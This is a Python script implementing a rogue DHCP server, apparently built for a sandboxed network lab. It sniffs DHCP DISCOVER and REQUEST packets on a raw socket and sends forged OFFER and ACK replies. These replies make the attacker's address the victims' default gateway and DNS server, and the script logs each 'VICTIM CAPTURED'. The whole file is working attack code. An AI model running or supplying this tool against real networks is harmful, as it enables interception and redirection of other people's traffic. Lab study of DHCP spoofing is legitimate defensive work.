import argparse
import ipaddress
import logging
import os
import sys
import time

sys.path.insert(0, os.path.join(os.path.dirname(__file__), ".."))

from common import dhcp, iface as ifacemod
from common.eth import BROADCAST_MAC, build_eth_header
from common.ip import build_ip_header
from common.rawsock import open_raw_socket, try_parse_dhcp_frame
from common.udp import build_udp_header

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [rogue-dhcp] %(message)s",
    handlers=[
        logging.StreamHandler(),
        logging.FileHandler(os.path.join(os.path.dirname(__file__), "..", "logs", "attacker.log")),
    ],
)
log = logging.getLogger(__name__)


class IPPool:
    def __init__(self, start: str, end: str, exclude: set):
        self._addrs = [
            str(ipaddress.IPv4Address(a))
            for a in range(int(ipaddress.IPv4Address(start)), int(ipaddress.IPv4Address(end)) + 1)
        ]
        self._exclude = exclude
        self._leased_to_mac = {}

    def allocate(self, mac: str) -> str:
        if mac in self._leased_to_mac:
            return self._leased_to_mac[mac]
        used = set(self._leased_to_mac.values()) | self._exclude
        for addr in self._addrs:
            if addr not in used:
                self._leased_to_mac[mac] = addr
                return addr
        raise RuntimeError("rogue IP pool exhausted")


class RogueDHCPServer:
    def __init__(self, args):
        self.iface = args.iface
        self.attacker_mac = ifacemod.get_mac(self.iface)
        self.attacker_ip = args.attacker_ip
        self.gateway = args.gateway or self.attacker_ip
        self.dns = args.dns or self.attacker_ip
        self.server_id = args.attacker_ip
        self.subnet_mask = args.netmask
        self.lease_time = args.lease_time
        self.pool = IPPool(args.pool_start, args.pool_end, exclude={self.attacker_ip})
        self.sock = open_raw_socket(self.iface)
        self.offered_xids = {}  
        self.captured = []

    def _send_dhcp(self, dst_mac: str, xid: int, chaddr: str, yiaddr: str, msg_type: int):
        options = dhcp.build_options(
            dhcp.opt_byte(dhcp.OPT_MSG_TYPE, msg_type),
            dhcp.opt_ip(dhcp.OPT_SERVER_ID, self.server_id),
            dhcp.opt_ip(dhcp.OPT_SUBNET_MASK, self.subnet_mask),
            dhcp.opt_ip(dhcp.OPT_ROUTER, self.gateway),
            dhcp.opt_ip(dhcp.OPT_DNS, self.dns),
            dhcp.opt_u32(dhcp.OPT_LEASE_TIME, self.lease_time),
        )
        dhcp_payload = dhcp.build_dhcp_packet(
            op=dhcp.BOOTREPLY, xid=xid, chaddr_mac=chaddr, options=options,
            yiaddr=yiaddr, siaddr=self.attacker_ip,
        )
        udp_header = build_udp_header(
            dhcp.SERVER_PORT, dhcp.CLIENT_PORT, dhcp_payload,
            self.attacker_ip, "255.255.255.255",
        )
        ip_header = build_ip_header(
            self.attacker_ip, "255.255.255.255", len(udp_header) + len(dhcp_payload),
        )
        eth_header = build_eth_header(dst_mac, self.attacker_mac)
        frame = eth_header + ip_header + udp_header + dhcp_payload
        self.sock.send(frame)

    def handle_discover(self, pkt, recv_time):
        xid, chaddr = pkt["xid"], pkt["chaddr"]
        offered_ip = self.pool.allocate(chaddr)
        self.offered_xids[xid] = (chaddr, offered_ip)
        self._send_dhcp(chaddr, xid, chaddr, offered_ip, dhcp.OFFER)
        latency_ms = (time.perf_counter() - recv_time) * 1000
        log.info("DISCOVER from %s (xid=%08x) -> forged OFFER of %s in %.3f ms",
                  chaddr, xid, offered_ip, latency_ms)

    def handle_request(self, pkt, recv_time):
        xid, chaddr = pkt["xid"], pkt["chaddr"]
        entry = self.offered_xids.get(xid)
        if not entry:
            return  
        offered_mac, offered_ip = entry
        if offered_mac != chaddr:
            return
        requested = pkt.get("requested_ip") or pkt.get("ciaddr")
        if requested not in (offered_ip, "0.0.0.0", None):
            return
        self._send_dhcp(chaddr, xid, chaddr, offered_ip, dhcp.ACK)
        latency_ms = (time.perf_counter() - recv_time) * 1000
        log.warning("REQUEST from %s selected OUR offer -> forged ACK (%s) in %.3f ms",
                     chaddr, offered_ip, latency_ms)
        self.captured.append((chaddr, offered_ip, time.time()))
        log.warning("VICTIM CAPTURED: mac=%s ip=%s gateway/dns=%s", chaddr, offered_ip, self.gateway)

    def run(self):
        log.info("Rogue DHCP server up on %s (attacker_ip=%s mac=%s) - gateway/dns -> %s",
                  self.iface, self.attacker_ip, self.attacker_mac, self.gateway)
        while True:
            frame = self.sock.recv(65535)
            recv_time = time.perf_counter()
            parsed = try_parse_dhcp_frame(frame)
            if not parsed:
                continue
            _eth, _ip, udp = parsed
            if udp["dst_port"] != dhcp.SERVER_PORT:
                continue 
            pkt = dhcp.parse_dhcp_packet(udp["payload"])
            if not pkt:
                continue
            if pkt["msg_type"] == dhcp.DISCOVER:
                self.handle_discover(pkt, recv_time)
            elif pkt["msg_type"] == dhcp.REQUEST:
                self.handle_request(pkt, recv_time)


def parse_args():
    p = argparse.ArgumentParser(description=__doc__)
    p.add_argument("--iface", required=True, help="interface on the shared L2 segment, e.g. veth-att")
    p.add_argument("--attacker-ip", required=True, help="IP the attacker binds as rogue server identifier")
    p.add_argument("--netmask", default="255.255.255.0")
    p.add_argument("--gateway", default=None, help="default gateway handed to victims (default: attacker IP)")
    p.add_argument("--dns", default=None, help="DNS server handed to victims (default: attacker IP)")
    p.add_argument("--pool-start", required=True)
    p.add_argument("--pool-end", required=True)
    p.add_argument("--lease-time", type=int, default=300)
    return p.parse_args()


if __name__ == "__main__":
    if os.geteuid() != 0:
        sys.exit("This tool needs CAP_NET_RAW - run as root inside your sandbox.")
    RogueDHCPServer(parse_args()).run()
